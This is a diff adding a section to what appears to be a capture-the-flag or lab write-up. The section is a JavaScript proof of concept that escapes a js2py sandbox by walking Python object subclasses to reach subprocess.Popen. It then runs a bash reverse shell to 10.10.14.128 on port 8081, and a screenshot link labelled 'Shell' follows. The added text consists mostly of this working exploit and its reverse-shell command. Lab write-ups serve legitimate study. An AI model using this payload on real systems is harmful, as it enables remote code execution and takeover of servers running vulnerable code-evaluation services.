@@ -107,4 +107,46 @@ def run_code():
         return jsonify({'error': str(e)})
 ```
 
+- Proof-of-concept to execute shell-:
+
+```js
+// [+] command goes here:
+let cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.128/8081 0>&1'"
+let hacked, bymarve, n11
+let getattr, obj
+
+hacked = Object.getOwnPropertyNames({})
+bymarve = hacked.__getattribute__
+n11 = bymarve("__getattribute__")
+obj = n11("__class__").__base__
+getattr = obj.__getattribute__
+
+function findpopen(o) {
+    let result;
+    for(let i in o.__subclasses__()) {
+        let item = o.__subclasses__()[i]
+        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
+            return item
+        }
+        if(item.__name__ != "type" && (result = findpopen(item))) {
+            return result
+        }
+    }
+}
+
+n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
+console.log(n11)
+n11
+```
+
+-  Shell-:
+
+<img width="1102" height="274" alt="image" src="https://github.com/user-attachments/assets/dc1d1767-6af2-4c5c-9193-834281b65570" />
+
+-------------
+
+### User `Marco`
+
+-------------
+
 - 
